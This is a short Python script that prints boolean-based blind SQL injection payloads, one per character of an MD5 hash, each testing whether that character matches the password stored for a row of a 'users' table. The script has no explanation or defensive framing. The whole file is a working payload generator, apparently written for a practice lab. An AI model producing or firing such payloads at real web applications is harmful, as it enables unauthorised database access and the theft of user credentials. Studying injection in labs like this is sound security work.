text = '5f4dcc3b5aa765d61d8327deb882cf99'
i=0
for character in text:
    i=i+1
    print("1' and ascii(substr((select password from users limit 1 offset 4),"+str(i)+"))=" + str(ord(character))+"#")
